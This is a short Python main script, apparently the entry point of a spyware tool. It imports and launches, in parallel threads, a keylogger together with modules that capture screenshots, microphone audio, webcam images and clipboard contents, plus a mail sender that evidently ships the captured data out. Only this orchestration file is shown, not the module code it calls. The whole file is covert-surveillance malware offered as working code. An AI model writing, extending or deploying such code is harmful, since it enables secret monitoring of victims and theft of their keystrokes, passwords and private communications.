#!/usr/bin/python3

import concurrent.futures

from src.keylogger import KeyLogger
from src.system_info import SysInfo
from src.screenshots import Screenshots
from src.microphone import Microphone
from src.webcamera import WebCamera
from src.clipboard import Clipboard
from src.send_mail import Mail

from src.create_files import make_dir

def microphone():
    m = Microphone()
    m.run()

def screenshot():
    screen = Screenshots()
    screen.run()

def keylogger():
    k = KeyLogger()
    k.run()

def web_camera():
    w = WebCamera()
    w.run()

def clipboard():
    cb = Clipboard()
    cb.run()

def mail():
    m = Mail()
    m.run()


if __name__ == "__main__":
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.submit(make_dir)
        executor.submit(microphone)
        executor.submit(screenshot)
        executor.submit(keylogger)
        executor.submit(clipboard)
        executor.submit(web_camera)
        executor.submit(mail)
